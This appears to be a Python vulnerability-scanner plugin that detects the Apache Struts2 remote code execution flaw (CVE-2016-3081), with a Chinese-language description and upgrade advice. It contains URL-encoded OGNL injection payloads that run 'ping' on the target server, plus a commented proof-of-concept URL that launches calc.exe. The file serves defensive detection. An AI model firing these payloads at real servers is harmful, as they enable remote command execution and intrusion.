#!/usr/bin/python
# -*- coding: utf-8 -*-

from engine.engine_utils.common import *
from urlparse import urlparse
from engine.logger import scanLogger as logger
'''
CVE-2016-3081
CVE-2016-3087
CNNVD-201606-150

CVSS分值:	9.3	[严重(HIGH)]

CWE-77	[在命令中使用的特殊元素转义处理不恰当（命令注入）]

Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架，主要提供两个版本框架产品，Struts 1和Struts 2。Apache Struts 2是Apache Struts的下一代产品，是在Struts 1和WebWork的技术基础上进行了合并的全新Struts 2框架，其体系结构与Struts 1差别较大。
Apache Struts 2.3.20版本至2.3.28版本（除了2.3.20.3版本和2.3.24.3版本）中存在安全漏洞。当程序使用REST插件并启用Dynamic Method Invocation(动态方法调用)时，远程攻击者可通过传递恶意的表达式利用该漏洞在服务器端执行任意代码。

solu: 升级至struts 2.3.28.1或更高版本
目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：
https://struts.apache.org/docs/s2-033.html
https://struts.apache.org/docs/version-notes-23203.html
https://struts.apache.org/docs/version-notes-23243.html
https://struts.apache.org/docs/version-notes-2328.html
'''

def run_url(http, ob, item):
    header = {
        "Host": ob['domain'],
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Referer": item['refer'],
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        # "Cookie": ob.get('cookie')
    }
    try:
        path = item['url']
        params = item['params']
        method = item['method']
        timeout = ob.get('webTimeout')
        pattern = r'(.*action?|dowanload.*action?)'

        result = []
        if not re.search(pattern, path, re.I):
            pass

        else:
            url_parse = urlparse(path)
            netloc = url_parse.netloc
            source_ip = ob.get('source_ip')
            if source_ip:
                netloc = source_ip

            """http://localhost:8080/struts2-rest-showcase-280/orders/3!%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23xx%3d123,%23xx.toString.json?&command=calc.exe"""

            cmd1 = "a%3d1%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40" \
                   "java.lang.Runtime%40getRuntime().exec(%27ping%27).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew+" \
                   "java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b50000%5d%2c%23c.read(%23d)%2c%23sbtest%3d%40" \
                   "org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23sbtest.println(%23d)%2c%23sbtest.close())%7d"

            cmd2 = "a%3d1%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40" \
                   "java.lang.Runtime%40getRuntime().exec(%27ping%27).getInputStream()%2c%23b%3" \
                   "dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew+java.io.BufferedReader(%23b)%2c%23d%3" \
                   "dnew+char%5b50000%5d%2c%23c.read(%23d)%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40" \
                   "getResponse().getWriter()%2c%23sbtest.println(%23d)%2c%23sbtest.close())%7d"
            for cmd in [cmd1, cmd2]:
                new_url = '%s://%s/%s?%s' % (url_parse.scheme, netloc, url_parse.path, cmd)
                res, content = http.request(new_url, method.upper(), headers=header)
                if res.get('status') == '200':
                    if re.search(r'ping.*\[-(c|n) count\].*\[-i', content, re.M|re.I):
                        response = getResponse(res, content)
                        request = getRequest(new_url, headers=header, domain=ob['domain'])
                        detail = " Apache Struts2 Skill名远程代码执行漏洞"
                        result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
                        break
        return result

    except Exception, e:
        logger.error("Struts2_S032DynamicMethodInvocation.py, run_url function :%s" % (str(e)))
        return result
